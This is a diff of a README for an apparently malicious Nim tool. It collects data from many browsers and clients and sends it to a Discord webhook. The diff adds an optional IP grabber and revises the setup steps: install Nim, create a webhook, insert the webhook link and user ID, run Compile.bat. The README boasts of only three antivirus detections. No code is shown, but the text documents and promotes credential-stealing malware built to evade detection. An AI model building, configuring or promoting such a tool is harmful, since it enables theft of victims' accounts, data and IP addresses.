@@ -9,6 +9,7 @@
 - Written with pure libs (no need for DLLs)
 - No caching, everything done on-time
 - Supports a LOT of browsers and clients
+- Optional IP Grabber (can be toggled in file)
 - Wow only 3 detections
 
 <p align=center>
@@ -19,7 +20,7 @@
 - **MUST: Install Nim [(using my guide)](https://gist.github.com/NullCode1337/95addeca955456c92aeb9fbc26f3615a)**
 - Since this needs a Discord Webhook (like all things do), go create one
 - Download repo as zip / git clone, and store somewhere
-- Replace the webhook link and user ID with your thingies
+- Replace the webhook link, user ID and everything else with your things
 - Run `Compile.bat`, which will sort out everything for you
 
 Or if you want to do manually:
@@ -37,3 +38,4 @@ Or if you want to do manually:
 - [ ] Nicer upload (using embeds)
 - [X] Testing on computers without the nim toolchain
 - [X] Make code less weird
+- [X] IP Grabber
